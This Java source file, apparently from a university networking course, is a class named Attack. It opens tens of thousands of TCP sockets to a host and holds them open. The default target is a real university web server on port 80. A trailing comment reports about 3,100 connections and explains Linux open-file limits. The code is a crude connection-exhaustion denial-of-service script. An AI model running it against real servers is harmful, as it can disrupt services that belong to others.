package ch.fhnw.ds.networking.tcp;

import java.io.IOException;
import java.net.Socket;
import java.util.HashSet;
import java.util.Set;

public class Attack {

    public static void main(String[] args) throws Exception {
        String host = "web.fhnw.ch";
        // Bsp: https://web.fhnw.ch/plattformen/makerstudio/
        int port = 80;

        if (args.length > 0) {
            host = args[0];
        }
        if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }

        Set<Socket> set = new HashSet<>();

        for (int i = 0; i < 65536; i++) {
            if (i % 100 == 0) System.out.println(i);
            Socket s = null;
            try {
                s = new Socket(host, port);
            } catch (IOException e) {
                System.out.println(e.getMessage());
                break;
            }
            set.add(s);
        }
        System.in.read();
        System.out.println("done");

    }
}

/*

=> approx 3100 connections, until Connection timed out exception is thrown
 
java.net.SocketException: Too many open files
       at java.net.PlainSocketImpl.socketAccept(Native Method)

To avoid this you have to increase the number of open files in the configuration file of your Linux System. 
There are two limits. One is global (for all users) and one is a per-user limit (1024 by default).

http://doc.nuxeo.com/display/KB/java.net.SocketException+Too+many+open+files
http://javarevisited.blogspot.ch/2013/08/how-to-fix-javanetsocketexception-too-many-open-files-java-tomcat-weblogic.html

*/
